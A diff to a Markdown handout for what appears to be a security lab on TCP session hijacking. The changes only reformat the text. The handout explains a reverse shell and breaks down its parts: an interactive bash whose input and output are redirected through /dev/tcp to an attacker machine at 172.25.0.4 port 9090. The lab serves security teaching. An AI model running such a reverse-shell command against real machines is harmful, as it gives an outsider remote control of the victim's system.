@@ -146,9 +146,11 @@ running on a remote machine, connecting back to the attacker’s machine. This g
 In the following, we show how we can set up a reverse shell if we can directly run a command on the victim’s machine (i.e. the server machine). In the TCP session hijacking attack, attackers cannot directly run a command on the victim’s machine, so their job is to run a reverse-shell command through the session hijacking attack. In this task, students need to demonstrate that they can achieve this goal.
 
 ![](media/tcpipA.jpg)
+
 (a) Use netcat to listen to connection
 
 ![](media/tcpipB.jpg)
+
 (b) Run the reverse shell
 
 
@@ -162,7 +164,9 @@ This command has the following pieces:
 ```
  "/bin/bash -i": i stands for interactive, meaning that the shell must be interactive (must provide a shell prompt)
 
- "> /dev/tcp/172.25.0.4/9090": This causes the output (stdout) of the shell to be redirected to the tcp connection to 172.25.0.4’s port 9090. The output stdout is represented by file descriptor number 1.
+ "> /dev/tcp/172.25.0.4/9090": This causes the output (stdout) of the shell to be redirected to the tcp connection to 172.25.0.4’s port 9090. 
+ 
+ The output stdout is represented by file descriptor number 1.
 
  "0<&1": File descriptor 0 represents the standard input (stdin). This causes the stdin for the shell to be obtained from the tcp connection.
 
